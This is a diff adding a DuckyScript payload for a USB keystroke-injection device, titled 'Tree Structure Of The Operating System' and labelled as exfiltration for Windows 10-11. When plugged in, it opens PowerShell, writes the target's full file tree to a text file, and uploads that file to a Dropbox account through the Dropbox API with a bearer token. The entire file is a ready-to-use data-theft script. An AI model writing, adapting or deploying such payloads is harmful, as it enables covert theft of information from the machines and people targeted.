@@ -1,0 +1,52 @@
+###########################################################
+#                                                         #
+# Title        : Tree Structure Of The Operating System   #
+# Author       : Aleff                                    #
+# Version      : 1.0                                      #
+# Category     : Exfiltration                             #
+# Target       : Windows 10-11                            #
+#                                                         #
+###########################################################
+
+ATTACKMODE HID
+
+# REQUIREMENTS
+# - Internet connection
+
+# VARIABLES
+# Set your Dropbox access token
+DROPBOX_ACCESS_TOKEN='example'
+
+QUACK GUI r
+QUACK DELAY 1000
+QUACK STRING PowerShell
+QUACK ENTER
+QUACK DELAY 1000
+
+# Setting about exfiltration
+QUACK STRING tree /f /a > out.txt
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING \$filePath='./out.txt';
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING \$fileContent = [System.IO.File]::ReadAllBytes(\$filePath)
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING \$dropboxFilePath='/out_exported.txt'
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING \$headers = @{}
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING \$headers.Add('Authorization', 'Bearer $DROPBOX_ACCESS_TOKEN')
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING \$headers.Add('Dropbox-API-Arg', '{\"path\":\"' + \$dropboxFilePath + '\",\"mode\":\"add\",\"autorename\":true,\"mute\":false}')
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING \$headers.Add('Content-Type', 'application/octet-stream')
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING Invoke-RestMethod -Uri 'https://content.dropboxapi.com/2/files/upload' -Headers \$headers -Method Post -Body \$fileContent; exit;
+QUACK ENTER
